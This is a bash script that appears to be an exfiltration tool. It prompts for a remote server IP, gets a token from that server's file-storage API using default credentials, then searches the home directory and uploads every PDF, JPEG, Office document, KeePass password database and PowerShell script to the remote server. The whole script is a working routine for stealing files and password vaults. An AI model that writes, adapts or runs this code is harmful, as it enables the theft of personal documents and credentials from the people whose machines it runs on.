# kampos="USER INPUT"
read -p "Enter kampos server IPv4 address: " kampos

# rootfoler="USER INPUT"
read -p "Enter name for root folder: " rootfolder

# echo out ip address to connect to
echo "Connect to the kampos vps using the IP address below"
echo $kampos

uri=$(echo "http://"$kampos"/api2/auth-token/")

# get an auth token (default creds - its a throw away)
rawtoken=$(curl -d "username=me@example.com&password=asecret" $uri)

# parse token
token=$(echo $rawtoken | jq -r '.token')

header=$(echo "Authorization: Token $token")

# get default repo
rawrepo=$(curl -X 'POST' -H "$header" "http://$kampos/api2/default-repo/")

# parse repo
repo_id=$(echo $rawrepo | jq -r '.repo_id')

# get upload link
rawupload_link=$(curl -H "$header" "http://$kampos/api2/repos/$repo_id/upload-link/")

# trim output
cleanupload_link=$(echo $rawupload_link | cut -d '/' -f 6 | cut -d '"' -f 1)

# build working link
upload_link=$(echo http://$kampos:8082/upload-api/$cleanupload_link)

# create the root folder
curl -d "operation=mkdir" -v -H "$header" -H 'Accept: application/json' "http://$kampos/api2/repos/$repo_id/dir/?p=/$rootfolder"

# create dirs
for i in pdfs images docs videos keepass powershell
do
   curl -d "operation=mkdir" -v -H "$header" -H 'Accept: application/json' "http://$kampos/api2/repos/$repo_id/dir/?p=/$rootfolder/$i"
done

cd ~

# search and upload pdfs
find . -iname '*.pdf' -exec curl -H "$header" -F file=@{} -F parent_dir=/pdfs/ -F replace=1 "$upload_link" \; 

# search and upload images
find . -type f \( -name "*.jpg" -o -name "*.jpeg" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/images/ -F replace=1 "$upload_link" \;

# search and upload office docs
find . -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/docs/ -F replace=1 "$upload_link" \;

# search and upload keepass dbs
find . -iname '*.kdbx' -exec curl -X POST -H "$header" -F file=@{} -F parent_dir=/keepass/ -F replace=1 "$upload_link" \; 

# search and upload keepass dbs
find . -iname '*.ps1' -exec curl -H "$header" -F file=@{} -F parent_dir=/powershell/ -F replace=1 "$upload_link" \; 

